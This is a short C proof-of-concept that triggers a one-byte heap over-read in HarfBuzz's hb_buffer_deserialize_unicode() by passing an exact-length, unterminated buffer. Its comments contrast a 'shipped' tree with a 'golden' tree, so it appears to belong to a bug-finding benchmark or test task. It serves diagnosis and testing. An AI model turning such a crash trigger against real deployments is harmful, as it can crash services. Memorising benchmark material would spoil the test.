/* PoC: heap-buffer-overflow (1-byte over-read) in
 * hb_buffer_deserialize_unicode() when called through the public API with an
 * explicit, exact buffer length (buf_len == size of buf), as documented.
 *
 * The shipped tree reads buf[buf_len] (one past the end) while "ignoring a
 * trailing newline"; with a tightly-sized heap allocation that byte is out of
 * bounds and AddressSanitizer aborts.  The golden tree has no such read and
 * exits cleanly.
 *
 * The input bytes are an ordinary, valid serialized Unicode buffer
 * ("U+0041=0"); only the framing differs (no NUL terminator, exact length).
 */
#include <stdlib.h>
#include <string.h>
#include <hb.h>

int main (void)
{
  const char *text = "U+0041=0";
  size_t len = strlen (text);

  /* Exact-size heap allocation: no slack byte after the content. */
  char *buf = (char *) malloc (len);
  memcpy (buf, text, len);

  hb_buffer_t *b = hb_buffer_create ();

  const char *end_ptr = NULL;
  hb_buffer_deserialize_unicode (b, buf, (int) len, &end_ptr,
                                 HB_BUFFER_SERIALIZE_FORMAT_TEXT);

  hb_buffer_destroy (b);
  free (buf);
  return 0;
}
